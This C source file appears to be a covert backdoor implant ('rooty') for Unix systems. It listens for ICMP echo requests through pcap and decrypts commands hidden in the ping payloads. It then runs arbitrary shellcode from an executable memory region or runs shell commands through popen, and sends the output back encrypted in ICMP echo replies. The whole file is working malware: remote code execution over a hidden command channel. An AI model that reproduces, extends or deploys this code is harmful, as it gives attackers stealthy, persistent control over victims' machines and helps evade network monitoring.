#include "rooty_unix.h"

/*--------------------------------------------------------------------*/
/*--- checksum - standard 1s complement checksum                   ---*/
/*--------------------------------------------------------------------*/
unsigned short checksum(void *b, int len)
{	unsigned short *buf = b;
	unsigned int sum=0;
	unsigned short result;

	for ( sum = 0; len > 1; len -= 2 )
		sum += *buf++;
	if ( len == 1 )
		sum += *(unsigned char*)buf;
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	result = ~sum;
	return result;
}


int build_packet(unsigned char *pkt, const struct icmp_hdr *icmp_input, ROOTY_MESSAGE *msg) {
	struct icmp_hdr *icmp = NULL;
	uint8_t *pkt_data = NULL;
    uint32_t data_size = sizeof(ROOTY_MESSAGE) + msg->len;

	if((pkt != NULL) && (icmp_input != NULL)) {
		icmp = (struct icmp_hdr *)pkt;
		pkt_data = (uint8_t *)(pkt + sizeof(struct icmp_hdr));

		// Required ICMP fields
		icmp->type = 0;
		icmp->code = 0;
		icmp->un.echo.id = icmp_input->un.echo.id;
		icmp->un.echo.sequence = icmp_input->un.echo.sequence;

		// Copy the data into the packet
		memcpy(pkt_data, (uint8_t *) msg, data_size);

        // Calculate the new checksum
		icmp->checksum = checksum(pkt, sizeof(struct icmp_hdr) + data_size);

		return (sizeof(struct icmp_hdr) + data_size);	
	}
	
	return 0;
}

void send_packet(ROOTY_MESSAGE *msg, const struct ip_hdr *ip, const struct icmp_hdr *icmp) {
	uint32_t pkt_size = 0;
	uint8_t *pkt = NULL;
    uint16_t data_len = 0;
	struct sockaddr_in sin;
	int output_socket = 0;

	// Make sure we have data
	if(msg->len) {

        // Pad data to the next block_size alignment
        data_len = sizeof(ROOTY_MESSAGE) + msg->len;

        if(data_len % BLOCK_SIZE) {
            data_len += BLOCK_SIZE - (data_len % BLOCK_SIZE);
        }

		// Encrypt the data
		if(decrypt_message(msg,  data_len)) {
            pkt_size = sizeof(struct icmp_hdr) + data_len;

            // Create a packet to store our response
            if ((pkt = malloc(pkt_size)) == 0) {
			    DEBUG_WRAP(fprintf(stderr, "Failed to malloc response packet of size: %d\n", pkt_size));
                return;
            }

			// Clear out the packet
			memset(pkt, 0, pkt_size);

			// Create our ICMP packet
            ((struct icmp_hdr *)pkt)->type = 0;
            ((struct icmp_hdr *)pkt)->code = 0;
            ((struct icmp_hdr *)pkt)->un.echo.id = icmp->un.echo.id;
            ((struct icmp_hdr *)pkt)->un.echo.sequence = icmp->un.echo.sequence;

            // Copy over our data to send
            memcpy(pkt + sizeof(struct icmp_hdr), msg, data_len);

            // Calculate the new checksum
            ((struct icmp_hdr *)pkt)->checksum = checksum(pkt, pkt_size);

            // Fill in the sockaddr
            sin.sin_family = AF_INET;
            sin.sin_port = 0;
            sin.sin_addr.s_addr = ip->ip_srcaddr;

            // Create our socket for sending responses
            if((output_socket = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) > 0) {

                // Not going to worry about failures
                if(sendto(output_socket, pkt, pkt_size, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) <= 0) {
                    DEBUG_WRAP(fprintf(stderr, "Unable to send packet\n"));
                }
                close(output_socket);
            }

            free(pkt);
		}
	}
}

void __attribute__ ((noinline)) execute_shellcode(const unsigned char *shellcode, const unsigned char *stack ) {

#ifdef __i386__

	// We dont' care about the old return address
	__asm__("pop %eax");

	// Save the new eip
	__asm__("pop %eax");
	
	// Set up the new stack
	__asm__("pop %esp");

	// Finally jump to the shellcode
	__asm__("jmp *%eax");

#else

	// Set up the new stack
	__asm__("mov %rsi, %rsp");

	// Finally jump to the shellcode
	__asm__("jmp *%rdi");

#endif
}

void run_shellcode(const unsigned char *shellcode, uint32_t size) {
	unsigned char *executable = NULL, *new_stack = NULL;
	
	// We need some more memory to work
	if((executable = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) == MAP_FAILED) {
		DEBUG_WRAP(fprintf(stderr, "Failed to mmap new executable area\n"));
		return;
	}
	DEBUG_WRAP(fprintf(stderr, "Created new executable section at 0x%p\n", executable));

	// Copy our prefix and shellcode in
	if(memcpy(executable, shellcode, size) != executable) {
		DEBUG_WRAP(fprintf(stderr, "Failed to copy shellcode to new executable memory region\n"));
		return;
	}

	// We need some more memory to work
        if((new_stack = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) == MAP_FAILED) {
		DEBUG_WRAP(fprintf(stderr, "Failed to mmap new stack area\n"));
		return;
	}
	DEBUG_WRAP(fprintf(stderr, "Created new stack section at 0x%p\n", new_stack));

	execute_shellcode(executable, new_stack + (STACK_SIZE / 2));
}

void run_command(ROOTY_MESSAGE *msg, const struct ip_hdr *ip, const struct icmp_hdr *icmp) {
    ROOTY_MESSAGE *res = NULL;
	FILE *fd = NULL;

    // Create a new response message to send back for each part of the output
    if((res = malloc(sizeof(ROOTY_MESSAGE) + MAX_PACKET_SIZE)) == NULL) {
        DEBUG_WRAP(fprintf(stderr, "Failed to allocate response message\n"));
        return;
    }
    memset(res, 0, sizeof(ROOTY_MESSAGE) + MAX_PACKET_SIZE);
        
    // Copy the original message key for the response
    memcpy(res->key, msg->key, BLOCK_SIZE);

	// Add stderr redirection
	strcat((char *)msg->data, REDIRECT);

    // Execute the command
    DEBUG_WRAP(fprintf(stderr, "Executing command: %s\n", msg->data));

	if((fd = popen((char *)msg->data, "r")) != NULL) {
        
        while(fgets((char *)res->data, MAX_PACKET_SIZE, fd)) {
            res->type = MESSAGE_OS | MESSAGE_ARCH;
            res->len = strlen((char *)res->data);
            memcpy(res->magic, MAGIC, strlen(MAGIC));
			send_packet(res, ip, icmp);
			memset(res->magic, 0, MAX_PACKET_SIZE + sizeof(ROOTY_MESSAGE) - BLOCK_SIZE);
		}

		pclose(fd);
	}
}

void process_message(unsigned char *data, uint32_t size, const struct ip_hdr *ip, const struct icmp_hdr *icmp) {
    ROOTY_MESSAGE *msg = (ROOTY_MESSAGE *)data;
    pid_t pid;
    int status =0;

    // Make sure we have data
	if((size >= (BLOCK_SIZE * 2)) && (size % BLOCK_SIZE == 0)) {

        // The first block is the key that is BLOCK_SIZE in length
		if(decrypt_message(msg, size) > 0) {

			// Make sure the magic is there
			if(!strncmp((char *)msg->magic, MAGIC, strlen(MAGIC))) {
		        if((pid = fork()) >= 0) {
			        if(pid == 0) {
						switch(msg->type) {

                            case MESSAGE_SHELLCODE:
                                DEBUG_WRAP(fprintf(stderr, "Received shellcode packet\n"));
                                #ifdef FreeBSD
                                   DEBUG_WRAP(fprintf(stderr, "Shellcode not currently supported on FreeBSD"));
                                #else
                                   run_shellcode(msg->data, msg->len);
                                #endif
                                break;

                             case MESSAGE_COMMAND:
                                DEBUG_WRAP(fprintf(stderr, "Received command packet\n"));
                                #ifdef Windows
                                   DEBUG_WRAP(fprintf(stderr, "Shell commands not currently supported for Windows"));
                                #else
                                   run_command(msg, ip, icmp);
                                #endif
                                break;
                        }

						exit(0);
					}
					else {
						waitpid(-1, &status, WNOHANG | WUNTRACED | WCONTINUED);
					}
				}
			}
		}
	}
}

void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_char *pkt) {
	const struct ip_hdr *ip = NULL;
	const struct icmp_hdr *icmp = NULL;
	uint32_t size_ip, size_icmp;//, size_data;
	unsigned char *data = NULL;
  	uint32_t encap_size = SIZE_ETHERNET;

	// For cooked sockets this size will be different
    if(data_type == 113) {
        encap_size = 16;
    }

	// IP
	ip = (struct ip_hdr *)(pkt + encap_size);
	size_ip = ((ip->ip_header_len & 0x0f) * 4);
	
	// ICMP
	icmp = (struct icmp_hdr *)(pkt + encap_size + size_ip);
	size_icmp = sizeof(struct icmp_hdr);

	// Data
	data = (unsigned char *)(pkt + encap_size + size_ip + size_icmp);

	// Only want to deal with icmp echo requests
	if((icmp->type == 8) && (icmp->code == 0)) {
		process_message(data, (hdr->len - (data - pkt)), ip, icmp);
	}
}

int main(int argc, char **argv) {
	pcap_t *handle = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	char bpf_filter[] = "icmp and icmp[icmptype] == 8";
    char *interface = (char *)INTERFACE;

	// Seed random for later
	srand(time(NULL));

    // Use a different interface if it's specified
    if(argc == 2) {
        interface = argv[1];
    }

	// Opening the pcap device - Keep trying if the interface isn't up
	while((handle = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf)) == NULL) {
		DEBUG_WRAP(fprintf(stderr, "Error opening device %s: %s\n", interface, errbuf));
        sleep(1);
	}

    data_type = pcap_datalink(handle);
    DEBUG_WRAP(fprintf(stderr, "Datalink Type: %d\n", data_type));
  
	// We only want to see ICMP traffic
	if(pcap_compile(handle, &fp, bpf_filter, 0, 0xffffffff)) {
		DEBUG_WRAP(fprintf(stderr, "Error compiling bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle)));
		return -1;
	}

	// Finally set up our filter
	if(pcap_setfilter(handle, &fp)) {
		DEBUG_WRAP(fprintf(stderr, "Error applying bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle)));
		return -1;
	}

	// We don't care about children
	signal(SIGCHLD, SIG_IGN);

	// Now we can finally sniff
	pcap_loop(handle, -1, process_packet, NULL);

	return 0;
}
